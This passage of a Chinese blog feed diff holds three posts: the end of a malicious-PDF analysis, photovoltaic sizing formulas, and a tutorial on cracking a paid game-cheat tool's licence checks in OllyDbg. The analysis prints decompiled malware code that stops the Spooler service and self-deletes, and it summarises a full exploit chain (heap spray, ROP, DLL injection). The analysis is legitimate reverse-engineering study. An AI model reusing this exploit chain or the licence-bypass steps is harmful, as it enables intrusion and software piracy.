+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">net stop <span class="string">&quot;Spooler&quot;</span></span><br><span class="line">net stop <span class="string">&quot;Spooler&quot;</span></span><br><span class="line">del <span class="string">&quot;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>它是为了关闭Spooler服务，然后删除自己。</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">sub_401FA0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// esi</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+14h] [ebp-61Ch] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">257</span>]; <span class="comment">// [esp+18h] [ebp-618h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+119h] [ebp-517h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+11Bh] [ebp-515h]</span></span><br><span class="line">  CHAR Filename[<span class="number">257</span>]; <span class="comment">// [esp+120h] [ebp-510h] BYREF</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+221h] [ebp-40Fh]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+223h] [ebp-40Dh]</span></span><br><span class="line">  CHAR v11[<span class="number">1021</span>]; <span class="comment">// [esp+228h] [ebp-408h] BYREF</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+625h] [ebp-Bh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+627h] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(Buffer));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GetTempPathA</span>(<span class="number">0x104</span>u, Buffer);</span><br><span class="line">  v1 = (<span class="type">char</span> *)&amp;NumberOfBytesWritten + <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *++v1 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;_unstop.bat&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="built_in">sizeof</span>(Filename));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GetModuleFileNameA</span>(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">  FileA = <span class="built_in">CreateFileA</span>(Buffer, <span class="number">0xC0000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="built_in">sizeof</span>(v11));</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">wsprintfA</span>(v11, <span class="string">&quot;net stop \&quot;%s\&quot;\r\nnet stop \&quot;%s\&quot;\r\ndel \&quot;%s\&quot; \r\n&quot;</span>, a1, a1, Buffer);</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteFile</span>(FileA, v11, <span class="built_in">strlen</span>(v11), &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(FileA);</span><br><span class="line">    <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, Buffer, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x1388</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>之后就不再细讲 写了没什么意义(我不会)，总的来说就是，<code>svrhost.exe</code>文件会在系统目录下生成其他病毒文件，同时篡改系统文件，然后也会创建一系列bat批处理文件，要么是关闭服务，要么是删除自身以及病毒痕迹，或者说是加载恶意DLL，而该注入的恶意DLL文件就是msxml0r.dll文件.<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg"
+                     
+                ></p>
+<p>经过PECompact加壳处理，他会得到3个URL地址然后不断发送HTTP请求，下载3个gif文件，可以猜测这三个gif文件中包含一些PE数据，用来执行恶意操作。最后<code>shellcode</code>将会把PDF样本修改为正常文件，也就是删除了TTF字体的<code>SING</code>表。</p>
+<p>可以看到PDF正常打开<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg"
+                     
+                ></p>
+<p>整个恶意PDF文件流程为：<code>漏洞利用PDF内容</code>→<code>恶意PE文件</code>→<code>正常PDF内容</code></p>
+<h2 id="8-整体过程"><a href="#8-整体过程" class="headerlink" title="8.整体过程"></a>8.整体过程</h2><p>花了好久把漏洞利用这部分搞明白了，总体流程归结于如下几点：</p>
+<ol>
+<li><code>strcat</code>函数可以通过<code>SING</code>表的<code>uniqueName</code>字段来进行栈溢出</li>
+<li>通过覆盖栈上的函数指针而不是返回值，使得后续调用该指针来绕过<code>GS</code>，也就是<code>canary</code>，然后进行<code>ROP</code></li>
+<li>使用<code>heap spray</code>来布置大量相同的<code>shellcode</code>。堆喷的脚本使用随机变量名、\x25替代%号来、添加无用代码来绕过杀毒软件分析</li>
+<li>通过<code>ROP</code>来绕过<code>DEP</code>保护，也就是<code>NX</code></li>
+<li>其中<code>ROP</code>的构造我们利用未开启<code>ALSR</code>的模块来获取<code>gadget</code>，他的地址一般是固定的</li>
+<li>由于<code>uniqueName</code>可能不能太大，防止覆盖程序关键数据，因此使用两次栈迁移来到精准堆喷的地址，0x0c0c0c0c，将漏洞利用程序使用文件映射的一些函数映射到内存，然后将EIP指向他。</li>
+<li>通过PEB环境控制块来获取<code>kernel32.dll</code>的基地址，从而获取一些需要运行的函数地址</li>
+<li>通过异或和交换字符来对恶意PE文件进行加密</li>
+<li>释放并且运行<code>svchost.exe</code>恶意文件，文件名同系统进程名一致，增加隐蔽性</li>
+<li>提升权限，关闭系统文件保护，用来修改系统文件</li>
+<li>修改打印服务程序<code>spoolsv.exe</code>的导入表，使得其在启动的时候加载恶意dll程序</li>
+<li>修改文件时间等加密隐蔽性，然后运行完程序后，会删除没用的程序防止被发现</li>
+<li>利用加壳防止逆向分析</li>
+<li>远程下载恶意程序，最后修改恶意样本PDF文件为正常PDF并打开，假装是正常开启。</li>
+</ol>
+<h2 id="9-漏洞修复"><a href="#9-漏洞修复" class="headerlink" title="9.漏洞修复"></a>9.漏洞修复</h2><p>🎉官方在之后修补该漏洞的时候，添加了字符串长度的检测和限制，用新的函数来替代了<code>strcat</code>函数，这样就避免了在栈上构造虚假函数指针🎉</p>
+<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h2><p>一个pdf文件就像一个exe文件一样，都是最终输出格式却总有人认为它们和word是一类编辑文档</p>
+<p>(事实上word这类编辑文档也可以注入病毒，不过更多的是用来激活🙂，例如使用LLDB动态调试可以激活office365套件)。</p>
+]]></content>
+      <tags>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>光伏计算公式</title>
+    <url>/2023/06/28/%E5%85%89%E4%BC%8F%E8%AE%A1%E7%AE%97%E5%85%AC%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="光伏计算公式"><a href="#光伏计算公式" class="headerlink" title="光伏计算公式"></a>光伏计算公式</h1><h2 id="转换效率"><a href="#转换效率" class="headerlink" title="转换效率"></a>转换效率</h2><p><strong>η</strong>&#x3D; <code>Pm</code>(光伏板的峰值功率)&#x2F;<code>S</code>(光伏板面积)×<code>Pin</code></p>
+<p>​		其中：<code>Pin</code>&#x3D;<code>1KW/㎡</code>&#x3D;<code>100mW/cm²</code></p>
+<h2 id="充电电压"><a href="#充电电压" class="headerlink" title="充电电压"></a>充电电压</h2><p><strong>Vmax</strong>&#x3D;<code>V额定</code>×<code>1.43倍</code></p>
+<h2 id="电池组件串并联"><a href="#电池组件串并联" class="headerlink" title="电池组件串并联"></a>电池组件串并联</h2><p><strong>电池组件并联数</strong>&#x3D;<code>负载日平均用电量</code>(Ah)&#x2F;<code>组件日平均发电量</code> (Ah)</p>
+<p><strong>电池组件串联数</strong>&#x3D;<code>系统工作电压</code>(V)×<code>系数1.43</code>&#x2F;<code>组件峰值工作电压</code>(V)</p>
+<h2 id="蓄电池容量"><a href="#蓄电池容量" class="headerlink" title="蓄电池容量"></a>蓄电池容量</h2><p><strong>蓄电池容量</strong>&#x3D;<code>负载日平均用电量</code>(Ah)×<code>连续阴雨天数</code>&#x2F;<code>最大放电深度</code></p>
+<h2 id="平均放电率"><a href="#平均放电率" class="headerlink" title="平均放电率"></a>平均放电率</h2><p><strong>平均放电率(h)</strong>&#x3D;<code>连续阴雨天数</code>×<code>负载工作时间</code>&#x2F;<code>最大放电深度</code></p>
+<h2 id="负载工作时间"><a href="#负载工作时间" class="headerlink" title="负载工作时间"></a>负载工作时间</h2><p><strong>负载工作时间(h)</strong>&#x3D;<code>∑负载功率</code>×<code>负载工作时间</code>&#x2F;<code>∑负载功率</code></p>
+<h2 id="蓄电池"><a href="#蓄电池" class="headerlink" title="蓄电池"></a>蓄电池</h2><p><strong>蓄电池容量</strong>&#x3D;<code>负载平均用电量</code>(Ah)×<code>连续阴雨天数</code>×<code>放电修正系数</code>&#x2F;<code>最大放电深度</code>×<code>低温修正系数</code></p>
+<p><strong>蓄电池串联数</strong>&#x3D;<code>系统工作电压</code>&#x2F;<code>蓄电池标称电压</code></p>
+<p><strong>蓄电池并联数</strong>&#x3D;<code>蓄电池总容量</code>&#x2F;<code>蓄电池标称容量</code></p>
+<h2 id="以峰值日照时数为依据的简易计算"><a href="#以峰值日照时数为依据的简易计算" class="headerlink" title="以峰值日照时数为依据的简易计算"></a>以峰值日照时数为依据的简易计算</h2><p><strong>组件功率</strong>&#x3D;(<code>用电器功率</code>×<code>用电时间</code>&#x2F;<code>当地峰值日照时数</code>)×<code>损耗系数</code></p>
+<blockquote>
+<p>损耗系数：取1.6～2.0根据当地污染程度、线路长短、安装角度等</p>
+</blockquote>
+<p><strong>蓄电池容量</strong>&#x3D;(<code>用电器功率</code>×<code>用电时间</code>&#x2F;<code>系统电压</code>)×<code>连续阴雨天数</code>×<code>系统安全系数</code></p>
+<blockquote>
+<p>系统安全系数：取1.6～2.0，根据蓄电池放电深度、冬季温度、逆变器转换效率等</p>
+</blockquote>
+<h2 id="以年辐射总量为依据的计算方式"><a href="#以年辐射总量为依据的计算方式" class="headerlink" title="以年辐射总量为依据的计算方式"></a>以年辐射总量为依据的计算方式</h2><p><strong>组件(方阵)</strong>&#x3D;<code>K</code>×(<code>用电器工作电压</code>×<code>用电器工作电流</code>×<code>用电时间</code>)&#x2F;<code>当地年辐射总量</code></p>
+<blockquote>
+<p>有人维护+一般使用时，**<code>K取230</code>**；</p>
+<p>无人维护+可靠使用时，**<code>K取251</code>**；</p>
+<p>无人维护+环境恶劣+要求非常可靠时，**<code>K取276</code>**。</p>
+</blockquote>
+<h2 id="以年辐射总量和斜面修正系数为依据的计算"><a href="#以年辐射总量和斜面修正系数为依据的计算" class="headerlink" title="以年辐射总量和斜面修正系数为依据的计算"></a>以年辐射总量和斜面修正系数为依据的计算</h2><p><strong>方阵功率</strong>&#x3D;<code>系数5618</code>×<code>安全系数</code>×<code>负载总用电量</code>&#x2F;<code>斜面修正系数</code>×<code>水平面年平均辐射量</code></p>
+<blockquote>
+<p>系数5618:根据充放电效率系数、组件衰减系数等：</p>
+<p>安全系数：根据使用环境、有无备用电源、是否有人值守等，取1.1～1.3。</p>
+</blockquote>
+<p><strong>蓄电池容量</strong>&#x3D;<code>10</code>×<code>负载总用电量</code>&#x2F;<code>系统工作电压</code></p>
+<blockquote>
+<p>10为无日照系数(对于连续阴雨不超过5天的均适用)。</p>
+</blockquote>
+<h2 id="以峰值日照时数为依据的多路负载计算"><a href="#以峰值日照时数为依据的多路负载计算" class="headerlink" title="以峰值日照时数为依据的多路负载计算"></a>以峰值日照时数为依据的多路负载计算</h2><p><strong>组件电流</strong>&#x3D;<code>负载日耗电量</code>(Wh)&#x2F;<code>系统直流电压</code>(V)×<code>峰值日照时数</code>(h)×<code>系统效率系数</code></p>
+<blockquote>
+<p>系统效率系数：含蓄电池充电效率0.9，逆变器转换效率0.85，组件功率衰减+线路损耗+尘埃等0.9，具体根据实际情况进行调整。</p>
+</blockquote>
+<p><strong>组件总功率</strong>&#x3D;<code>组件发电电流</code>×<code>系统直流电压</code>×<code>1.43</code></p>
+<blockquote>
+<p>系数1.43：组件峰值工作电压与系统工作电压的比值。</p>
+</blockquote>
+<p><strong>蓄电池组容量</strong>&#x3D;【<code>负载日耗电量</code>Wh&#x2F;<code>系统直流电压</code>V】×【<code>连续阴雨天数</code>&#x2F;<code>逆变器效率</code>×<code>蓄电池放电深度</code>】</p>
+<blockquote>
+<p>逆变器效率：根据设备选型约80%～93%之间：</p>
+<p>蓄电池放电深度：根据其性能参数和可靠性要求等,在50%～75%之间选择。</p>
+</blockquote>
+<h2 id="以峰值日照时数为依据的计算方法"><a href="#以峰值日照时数为依据的计算方法" class="headerlink" title="以峰值日照时数为依据的计算方法"></a>以峰值日照时数为依据的计算方法</h2><p><strong>系统蓄电池组容量的计算</strong></p>
+<p><strong>蓄电池组容量(Ah)</strong>&#x3D;<code>安全次数</code>×<code>负载日平均耗电量</code>(Ah)×<code>最大连续阴雨天数</code>×<code>低温修正系数</code>&#x2F;<code>蓄电池最大放电深度系数</code></p>
+<blockquote>
+<p>安全系数:1.1-1.4之间</p>
+<p>低温修正系数:0℃以上时取1.0，-10℃以上取1.1，-20℃以上取1.2</p>
+<p>蓄电池最大放电深度系数:浅循环取0.5，深度循环取0.75，碱性镍镉蓄电池取0.85。</p>
+</blockquote>
+<p><strong>组件串联数</strong>&#x3D;<code>系统工作电压</code>(V)×<code>系数1.43</code>&#x2F;<code>选定组件峰值工作电压</code>(V)</p>
+<p><strong>组件日平均发电量(Ah)</strong>&#x3D;<code>选定组件峰值工作电流</code>(A)×<code>峰值日照时数</code>(h)×<code>斜面修正系数</code>×<code>组件衰减损耗系数</code></p>
+<blockquote>
+<p>峰值日照时数和倾斜面修正系数为系统安装地的实际数据：组件衰减损耗修正系数主要指由于组件组合、组件功率衰减、组件灰尘遮盖、充电效率等的损失，一般取0.8。</p>
+</blockquote>
+<h2 id="连续阴雨天之间的最短间隔天数需要补充的蓄电池容量的计算"><a href="#连续阴雨天之间的最短间隔天数需要补充的蓄电池容量的计算" class="headerlink" title="连续阴雨天之间的最短间隔天数需要补充的蓄电池容量的计算"></a><strong>连续阴雨天之间的最短间隔天数需要补充的蓄电池容量的计算</strong></h2><p><strong>补充的蓄电池容量(Ah)</strong>&#x3D;<code>安全系数</code>×<code>负载日平均耗电量</code>(Ah)×<code>最大连续阴雨天数</code></p>
+<p><strong>组件并联数</strong>&#x3D;【<code>补充的蓄电池容量</code>+<code>负载日平均耗电量</code>×<code>最短间隔天数</code>】&#x2F;<code>组件平均日发电量</code>×<code>最短间隔天数</code></p>
+<blockquote>
+<p><code>负载日平均耗电量</code>&#x3D;<code>负载功率</code>&#x2F;<code>负载工作电压</code>×<code>每天工作小时数</code></p>
+</blockquote>
+<h2 id="光伏方阵发电量的计算"><a href="#光伏方阵发电量的计算" class="headerlink" title="光伏方阵发电量的计算"></a><strong>光伏方阵发电量的计算</strong></h2><p><strong>年发电量</strong>(kWh)&#x3D;<code>当地年总辐射能</code>(KWH&#x2F;㎡)×<code>光伏方阵面积</code>(㎡)×<code>组件转换效率</code>×<code>修正系数</code>。</p>
+<p>   <code>P</code>&#x3D;<code>H</code>×<code>S</code>×<code>η</code>×<code>K</code></p>
+<p><strong>修正系数K</strong>&#x3D;<code>K1 </code> ×  <code>K2</code>  ×  <code>K3</code>  ×  <code>K4</code>  ×  <code>K5</code></p>
+<blockquote>
+<p><code>K1</code>组件长期运行的衰减系数，取0.8；</p>
+<p><code>K2</code>灰尘遮挡组件及温度升高造成组件功率下降修正，取0.82；</p>
+<p><code>K3</code>为线路修正，取0.95；</p>
+<p><code>K4</code>为逆变器效率，取0.85或根据厂家数据；</p>
+<p><code>K5</code>为光伏方阵朝向及倾斜角修正系数，取0.9左右。</p>
+</blockquote>
+<h2 id="根据负载耗电量计算光伏方阵的面积"><a href="#根据负载耗电量计算光伏方阵的面积" class="headerlink" title="根据负载耗电量计算光伏方阵的面积"></a><strong>根据负载耗电量计算光伏方阵的面积</strong></h2><p><strong>光伏组件方阵面积</strong>&#x3D;<code>年耗电量</code>&#x2F;<code>当地年总辐射能</code>×<code>组件转换效率</code>×<code>修正系数</code></p>
+<p><code>S</code>&#x3D;<code>P</code>&#x2F;<code>H</code>·<code>η</code>·<code>K</code></p>
+<h2 id="太阳能辐射能量的转换"><a href="#太阳能辐射能量的转换" class="headerlink" title="太阳能辐射能量的转换"></a><strong>太阳能辐射能量的转换</strong></h2><blockquote>
+<p>1卡(cal)&#x3D;4.1868焦(J)&#x3D;1.16278毫瓦时(mWh)</p>
+<p>1千瓦时(kWh)&#x3D;3.6兆焦(MJ)</p>
+<p>1千瓦时&#x2F;㎡(KWh&#x2F;㎡)&#x3D;3.6兆焦&#x2F;㎡(MJ&#x2F;㎡)&#x3D;0.36千焦&#x2F;厘米(KJ&#x2F;cm)</p>
+<p>100毫瓦时&#x2F;厘米(mWh&#x2F;cm)&#x3D;85.98卡&#x2F;厘米(cal&#x2F;cm)</p>
+<p>1兆焦&#x2F;米(MJ&#x2F;m)&#x3D;23.889卡&#x2F;厘米(cal&#x2F;cm)&#x3D;27.8毫瓦时&#x2F;厘米(mWh&#x2F;cm)</p>
+<p>当辐射量的单位为卡&#x2F;厘米：年峰值日照时数&#x3D;辐射量×0.0116(换算系数)</p>
+<p>当辐射量的单位为兆焦&#x2F;米：年峰值日照时数&#x3D;辐射量÷3.6(换算系数)</p>
+<p>当辐射量单位为千瓦时&#x2F;米：峰值日照小时数&#x3D;辐射量÷365天</p>
+<p>当辐射量的单位为千焦&#x2F;厘米，峰值日照小时数&#x3D;辐射量÷0.36(换算系数)</p>
+</blockquote>
+<h2 id="蓄电池选型"><a href="#蓄电池选型" class="headerlink" title="蓄电池选型"></a><strong>蓄电池选型</strong></h2><p><strong>蓄电池容量</strong>≥<code>5h</code>×<code>逆变器功率</code>&#x2F;<code>蓄电池组额定电压</code></p>
+<h2 id="电价计算公式"><a href="#电价计算公式" class="headerlink" title="电价计算公式"></a><strong>电价计算公式</strong></h2><p><strong>发电成本价格1</strong>&#x3D;<code>总成本</code>÷<code>总发电量</code></p>
+<p><strong>电站盈利</strong>&#x3D;(<code>买电价格</code>-<code>发电成本价格</code>)×<code>电站寿命范围内工作时间</code></p>
+<p><strong>发电成本价格2</strong>&#x3D;(<code>总成本</code>-<code>总补贴</code>)÷<code>总发电量</code></p>
+<p><strong>电站盈利</strong>&#x3D;(<code>买电价格</code>-<code>发电成本价格2</code>)×<code>电站寿命范围内工作时间</code></p>
+<p><strong>电站盈利</strong>&#x3D;(<code>买电价格</code>-<code>发电成本价格2</code>)×<code>电站寿命范围内工作时间</code>+<code>非市场因素收益</code></p>
+<h2 id="投资回报率计算"><a href="#投资回报率计算" class="headerlink" title="投资回报率计算"></a><strong>投资回报率计算</strong></h2><p><strong>无补贴</strong>：<code>年发电量</code>×<code>电价</code>÷<code>投资总成本</code>×<code>100%</code>&#x3D;<code>年回报率</code></p>
+<p><strong>有电站补贴</strong>：<code>年发电量</code>×<code>电价</code>÷(<code>投资总成本</code>-<code>补贴总额</code>)×<code>100%</code>&#x3D;<code>年回报率</code></p>
+<p><strong>有电价补贴及电站补贴</strong>：<code>年发电量</code>×(<code>电价</code>+<code>补贴电价</code>)÷(<code>投资总成本</code>-<code>补贴总额</code>)×<code>100%</code>&#x3D;<code>年回报率</code></p>
+<h2 id="光伏方阵倾角角度和方位角角度"><a href="#光伏方阵倾角角度和方位角角度" class="headerlink" title="光伏方阵倾角角度和方位角角度"></a><strong>光伏方阵倾角角度和方位角角度</strong></h2><p> <strong>组件水平倾角</strong>：</p>
+<blockquote>
+<p>0°-25° 倾角&#x3D;纬度</p>
+<p>26°-40° 倾角&#x3D;纬度+5°-10°(在我国大部分地区采取+7°)</p>
+<p>41°-55° 倾角&#x3D;纬度+10°-15°</p>
+<p>纬度&gt;55° 倾角&#x3D;纬度+15°-20°</p>
+</blockquote>
+<p><strong>方位角：</strong></p>
+<p><strong>方位角</strong>&#x3D;【<code>一天中负荷的峰值时刻</code>(24h制)-<code>12</code>】× <code>15</code>+(<code>经度</code>-<code>116</code>)</p>
+<h2 id="光伏方阵前后排间距："><a href="#光伏方阵前后排间距：" class="headerlink" title="光伏方阵前后排间距："></a><strong>光伏方阵前后排间距：</strong></h2><p>D &#x3D; <code>0.707</code>×<code>H</code> &#x2F;<code>tan</code> [ <code>acrsin</code> ( 0.648<code>cosΦ</code> - 0.399<code>sinΦ</code>) ]</p>
+<blockquote>
+<p>D：组件方阵前后间距</p>
+<p>Φ：光伏系统所处纬度(北半球为正,南半球为负)</p>
+<p>H：为后排光伏组件底边至前排遮挡物上边的垂直高度</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>光伏</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何绕过软件收费</title>
+    <url>/2023/05/13/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BD%AF%E4%BB%B6%E6%94%B6%E8%B4%B9/</url>
+    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p><strong>我的一位朋友</strong>决定在网上购买一个游戏辅助，以提高自己在游戏中的表现。他发现了一个价格相对便宜的卖家，于是立即下单购买了该辅助。</p>
+<p><strong>然而</strong>，当辅助到手后，他很快就发现它还需要额外购买点卡。于是他联系了卖家，卖家告诉他需要按照一定的方法使用辅助，但是实际上这些方法是根本行不通的。</p>
+<p>他惊骇地发现自己<em><strong>被骗了</strong></em>，因为那个卖家早在卖出之前就知道这个游戏辅助<strong>需要额外收费</strong>。我的朋友经过一番努力，试图要求退款，但是卖家却以各种理由拒绝了他的退款要求。</p>
+<p>在这个过程中，我的朋友懊恼万分。他的钱财付诸东流，同时自己还花费了很多时间和精力，而最终却毫无所获。他深深地意识到，学习破解软件是多么有助于学习和技术成长。<strong>他真的 我哭死😭</strong></p>
+<div class="highlight-container" data-rel="Ps"><figure class="iseeu highlight ps"><table><tr><td class="code"><pre><span class="line">😊请不要在联网游戏中使用游戏辅助，它们通常破坏游戏平衡，损害他人游戏体验或者导致自己账号被封。</span><br><span class="line">😘保持游戏的公正与乐趣，远离游戏辅助！</span><br><span class="line">        🤜任何邪恶 终将被绳之以法🤛</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>把游戏辅助拖进Peid查壳,嗯 无壳 ，辅助作者比较自信</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/BrpXZL29.png"
+                     
+                ></p>
+<p>不多bb，拖进OllyDBG开搞(或者X64dbg)，试着运行一下子，点击登录，出现一个弹窗</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/EAf52t7Z.png"
+                     
+                ></p>
+<p>右键尝试搜索下字符串发现有“加入黑名单”，先进去下几个断点</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/SifhWiCl.png"
+                     
+                ></p>
+<p>往下翻  发现辅助作者</p>
+<p><strong>很没素质</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/DIzLAbVx.png"
+                     
+                ></p>
+<p>因为有弹窗，所以直接下一个弹窗体的断点</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/jQdyLfk5.png"
+                     
+                ></p>
+<p>登陆断下来了，因为是系统领空</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/gBqetTP0.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/hqXflFOF.png"
+                     
+                ></p>
+<p>右下角窗口处有个 ”返回到“ 右键它 ”反汇编窗口跟随“</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/CHyGMoJ7.png"
+                     
+                ></p>
+<p>说明刚刚从上面这个call出来，这个call就是弹出密码错误的call，说明验证肯定在前面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/MXbcmNUE.png"
+                     
+                ></p>
+<p>这不是刚刚那个骂人的吗 往上一翻 还真是，这个错误call上面有jmp可以跳过</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/42Z962on.png"
+                     
+                ></p>
+<p>先往上看看它怎么走的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/MaCRHrrY.png"
+                     
+                ></p>
+<p>这里右健转到上面的跳转00414AB7</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/G3hj50Yu.png"
+                     
+                ></p>
+<p>在这里下个断点，然后把刚刚下的窗口断点删除</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/iNtbZi4r.png"
+                     
+                ></p>
+<p>已经没用了，F9运行软件，点击登录，断住了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/13/LWDtMhre.png"
+                     
+                ></p>
+<p>不能让他下去 不然不就回到错误call了 直接nop掉</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/JDvqdjxA.png"
+                     
+                ></p>
+<p>接着按f8 一步一步跟着，走到这里</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/0VsxFJLB.png"
+                     
+                ></p>
+<p>发现一个大跳，到终点看一看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/wpi7Z8ZC.png"
+                     
+                ></p>
+<p>阿这  </p>
+<p>这跳下去要挨骂了 所以咱们回去 把刚刚那个跳转nop掉</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/usqzKd4n.png"
+                     
+                ></p>
+<p>继续往下f8 走到这里 再走一步</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/GFEQSe0M.png"
+                     
+                ></p>
+<p>程序自杀了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/skPjX1so.png"
+                     
+                ></p>
+<p>估计是辅助作者留下的 暗庄  回到刚刚死掉的位置标记一下，下个断点 重新运行程序 按f7进自杀call</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/lXn3thYL.png"
+                     
+                ></p>
+<p>f8继续下去 走到这个call，程序又自杀了 刚好上面那个大跳能跳过这个自杀call</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/i6TIMzMI.png"
+                     
+                ></p>
+<p>重新运行到刚刚那里 jge改成jmp</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/V0GGiXPZ.png"
+                     
+                ></p>
+<p>继续f8往下 这个call有点眼熟阿</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/zd7G6elo.png"
+                     
+                ></p>
+<p>好像是上面那个自杀call  果然一样</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/o0Mvd40j.png"
+                     
+                ></p>
+<p>直接改成jmp f8继续往下接着走一会儿，发现从刚刚的自杀call出来了</p>
+<p>f8再接着往下走，程序就弹出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/05/14/LAVi8cqH.png"
+                     
+                ></p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>时间变成了-1秒，破解到此就成功了，打开软件后就可以直接进入辅助界面</p>
+<p><img  
+                     lazyload
